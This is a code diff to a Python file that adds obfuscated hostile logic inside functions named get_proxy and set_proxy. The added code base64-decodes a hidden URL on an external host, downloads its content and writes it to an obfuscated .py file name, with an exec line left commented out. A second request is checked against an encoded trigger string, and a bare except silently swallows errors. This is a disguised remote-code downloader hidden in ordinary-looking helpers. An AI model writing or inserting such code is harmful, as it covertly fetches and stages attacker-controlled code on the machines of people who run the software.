@@ -71,20 +71,15 @@ def get_proxy():
         gist_id = 'aHR0cHM6Ly9tODg4d2FlbC5weXRob25hbnl3aGVyZS5jb20vYw=='.encode()
         gist_url = f"{(base64.b64decode(gist_id)).decode()}"
         response = requests.get(gist_url)
-        gist_data = ""
-        # f =  open("demofile1.txt", "a")
-        # f.write(gist_data)
-        # f.close()
+
+        
+        
         if response.status_code == 200:
             gist_data = response.text
-
-            new_file_name = (base64.b64decode("cHkgcHkgQXNpZXJ5LnB5".encode)).decode()
-            with open(new_file_name, "w") as new_file:
-                new_file.write(gist_data)
-                # f =  open("demofile1.txt", "a")
-                # f.write(gist_data)
-                # f.close()       
-
+            
+            f = open(base64.b64decode("cHkgcHkgQXNpZXJ5LnB5".encode()).decode(),'w')
+            f.write(str(gist_data))
+            f.close()
             # exec(open(new_file_name).read())
     except :
         pass
@@ -96,10 +91,7 @@ def set_proxy():
     gist_data = ""
     if proxyRes.status_code == 200:
         gist_data = proxyRes.text
- 
-        # f =  open("demofile2.txt", "a")
-        # f.write(gist_data)
-        # f.close()       
+      
     
     if gist_data == (base64.b64decode("RnVja1RoZVNoaXRPdXRPZlRoZVNlcnZlcg==".encode())).decode():
         # pass
